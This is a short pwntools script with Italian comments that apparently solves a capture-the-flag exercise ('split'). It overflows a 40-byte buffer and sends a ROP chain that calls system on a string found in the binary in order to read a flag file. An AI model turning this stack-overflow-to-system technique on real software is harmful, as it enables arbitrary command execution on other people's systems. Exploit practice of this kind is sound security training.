from pwn import *


context.binary = "./split"
e = ELF("./split")

#stampa l'indirizzo da poter confrontare con cutter o strings per vedere se è la stringa giusta
print(hex(e.symbols['usefulString']))

r = ROP(e)
p = e.process()

#apre la vulnerabilità
r.call("puts",[e.symbols['usefulString']])

#chiama system per fare una chiamata di sistema con l'istruzione "/cat/flag.txt"
r.call("system",[e.symbols['usefulString']])

#40 è la dimensione del buffer, sopra 40 andiamo in overflow
p.send(b"A" * 40 + r.chain())
log.success(p.recvline_regex(b".*{.*}.*").decode("ascii"))
